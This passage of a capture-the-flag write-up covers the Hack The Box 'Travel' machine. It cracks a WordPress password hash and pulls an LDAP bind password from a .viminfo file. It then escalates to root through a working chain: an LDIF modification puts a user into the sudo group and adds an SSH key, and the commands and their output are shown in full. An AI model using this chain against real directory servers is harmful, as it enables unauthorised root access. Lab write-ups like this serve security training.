INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
```
A hash yay.
This however does indeed crack with john and we get the password `1stepcloser`
so we now have the credentials `lynik-admin:1stepcloser`

# User.txt

And we manage to login in ssh and read the user flag.
```bash
┌──(kali㉿kali)-[~/htb/boxes/travel]
└─$ ssh lynik-admin@travel.htb
lynik-admin@travel.htb's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Wed 09 Sep 2020 04:32:14 PM UTC

  System load:                      0.06
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     12%
  Swap usage:                       0%
  Processes:                        201
  Users logged in:                  0
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

Last login: Wed Sep  9 16:31:53 2020 from 10.10.14.14
lynik-admin@travel:~$ cat user.txt
b349da48ec0{...}
```

# Root Enumeration

Running `ls -la` in the users home directory reveals the `.ldaprc` configuraion file
```bash
lynik-admin@travel:~$ ls -la
total 36
drwx------ 3 lynik-admin lynik-admin 4096 Apr 24 06:52 .
drwxr-xr-x 4 root        root        4096 Apr 23 17:31 ..
lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -> /dev/null                                                                   
-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lynik-admin lynik-admin 3771 Feb 25  2020 .bashrc
drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25  2020 .profile
-r--r--r-- 1 root        root          33 Sep  9 13:35 user.txt
-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
```
```bash
lynik-admin@travel:~$ cat .ldaprc 
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```
We also read the file `.viminfo` as that contains some useful information aswell
```bash
lynik-admin@travel:~$ cat .viminfo 
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1587670530,,"wq!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
""1     LINE    0
        BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"

# File marks:
'0  3  0  ~/.ldaprc
|4,48,3,0,1587670530,"~/.ldaprc"

# Jumplist (newest first):
-'  3  0  ~/.ldaprc
|4,39,3,0,1587670530,"~/.ldaprc"
-'  1  0  ~/.ldaprc
|4,39,1,0,1587670527,"~/.ldaprc"

# History of marks within files (newest to oldest):

> ~/.ldaprc
        *       1587670529      0
        "       3       0
        .       4       0
        +       4       0
```
We check the /etc/hosts file and we see that there is an ldap entry in there.
```
lynik-admin@travel:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 travel
172.20.0.10 ldap.travel.htb
```
The address connected to the ldap host seems to be a docker container ip so we can assume that we will be connecting to a docker container via ldap.

This website helped with the next stage.
[digital ocean ldap]https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities

We run
```
ldapsearch -x -w Theroadlesstraveled
```
This is the password we found inside the `.viminfo` file.
Running this we get alot of output so i will filter the useless things out.
```
# travel.htb
dn: dc=travel,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: Travel.HTB
dc: travel

# admin, travel.htb
dn: cn=admin,dc=travel,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator

# servers, travel.htb
dn: ou=servers,dc=travel,dc=htb
description: Servers
objectClass: organizationalUnit
ou: servers

# lynik-admin, travel.htb
dn: cn=lynik-admin,dc=travel,dc=htb
description: LDAP administrator
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: lynik-admin
userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
 =
```

We see here that we are the admin of the ldap service.
```
# domainusers, groups, linux, servers, travel.htb
dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
memberUid: frank
memberUid: brian
memberUid: christopher
memberUid: johnny
memberUid: julia
memberUid: jerry
memberUid: louise
memberUid: eugene
memberUid: edward
memberUid: gloria
memberUid: lynik
gidNumber: 5000
cn: domainusers
objectClass: top
objectClass: posixGroup
```
# modification of jane.ldif 
We are going to add any user from the sudoers group into the administrator ldaps account to that we can run ldap as sudo and hope for a root shell.
We add this content to our jane.ldif file:
```
dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: homeDirectory
homeDirectory: /root
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: <our ssh public key here>
-
replace: userPassword
userPassword: RootMe
-
replace: gidNumber
gidNumber: 27
```
We then run 
```bash
ldapmodify -D "cn=lynik-admin,dc=travel,dc=htb"  -w Theroadlesstraveled -f jane.ldif
To modify our entry and add jane to the admin account.
```
# SSH as Jane
```bash
ssh jane@travel.htb              
Creating directory '/home@TRAVEL/jane'.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Wed 09 Sep 2020 06:06:40 PM UTC

  System load:                      0.17
  Usage of /:                       46.1% of 15.68GB
  Memory usage:                     12%
  Swap usage:                       0%
  Processes:                        213
  Users logged in:                  1
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jane@travel:~$ whoami
jane
jane@travel:~$ sudo whoami
[sudo] password for jane: 
root
```
We then login as jane and we can run root commands as sudo with the password we created for her for example RootMe which was mine that i added to the ldif entry.
Then we can just simply sudo /bin/bash and read the root flag.
```bash
jane@travel:~$ sudo /bin/bash
root@travel:.# id && hostname
uid=0(root) gid=0(root) groups=0(root)
travel
```
